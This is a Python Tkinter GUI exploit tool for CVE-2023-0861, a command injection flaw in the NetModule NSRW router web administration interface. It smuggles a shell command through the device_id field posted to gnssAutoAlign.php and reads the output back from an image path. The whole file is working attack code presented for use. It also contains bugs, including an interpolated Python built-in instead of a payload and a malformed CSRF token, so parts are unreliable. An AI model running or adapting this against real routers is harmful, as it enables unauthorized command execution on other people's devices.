import re
import requests
import argparse
import urllib.parse
import tkinter
from tkinter import *
import tkinter as tk
from tkinter.ttk import *
from time import strftime
from tkinter import ttk
import requests

root = tkinter.Tk()
root.title("CVE_2023_0861 exploits")
root.geometry('600x400+0+0')
def printInput():
    inp = inputtxt.get(1.0, "end-1c")
    lbl.config(text = "attack url : "+inp)
    url = inp
    scroll_y = Scrollbar(root, orient=VERTICAL)
    txtarea = Text(root, yscrollcommand=scroll_y.set, font=(
            "times new roman", 15, "bold"), fg="#3206b8")
    scroll_y.pack(side=RIGHT, fill=Y)
    scroll_y.config(command=txtarea.yview)
    txtarea.pack(fill=BOTH, expand=1)

#parser = argparse.ArgumentParser(description='CVE-2023-0861 PoC')
#parser.add_argument('--url', type=str, required=True, help='URL of the vulnerable router')
#parser.add_argument('--phpsessid', type=str, required=True, help='Admin\'s PHP session ID for authentication')
#parser.add_argument('--payload', type=str, required=True, help='Command Injection Payload')
#args = parser.parse_args()

    url = f'{url}/admin/gnss.php'
    c = {'PHPSESSID':''}
    response = requests.get(url,cookies=c)
    csrf_token = re.search(r'<input type="hidden" name="csrf-token" value="([^"]+)">', response.text)
#print(csrf_token)
    data = {
       'toggleAlignment': 'test',
        'device_id': f'1; {id} > /home/www-data/admin/img/nothing.png; 2',
        'csrf-token': csrf_token,
    }
#print(f'1; {urllib.parse.unquote(args.payload)} > /home/www-data/admin/img/nothing.png 2')
    url = f'{url}/admin/gnssAutoAlign.php'

    response = requests.post(url, data=data,cookies=c)

    if response.status_code == 200:
        results = requests.get(f'{url}/admin/img/nothing.png',cookies=c)
        txtarea.insert(END, 'done!')
        txtarea.insert(END, results.content.decode())
       # print('done!')
       # print(results.content.decode())

Hacher = Label(root, text="NetModule NSRW web administration interface executes an OS command constructed with \nunsanitized user input. A successful exploit could allow an authenticated user to execute arbitrary \ncommands with elevated privileges. This issue affects NSRW: from 4.3.0.0 before 4.3.0.119, \nfrom 4.4.0.0 before 4.4.0.118, from 4.6.0.0 before 4.6.0.105, from 4.7.0.0 before 4.7.0.103").pack()  
Hacher = Label(root, text="Enter url http://www.example.com/ : ").pack()
inputtxt = tk.Text(root,height = 1,width = 80)
inputtxt.pack()
printButton = tk.Button(root,text = "exploit", command = printInput)
printButton.pack()
lbl = tk.Label(root, text = "")
lbl.pack()
root.mainloop()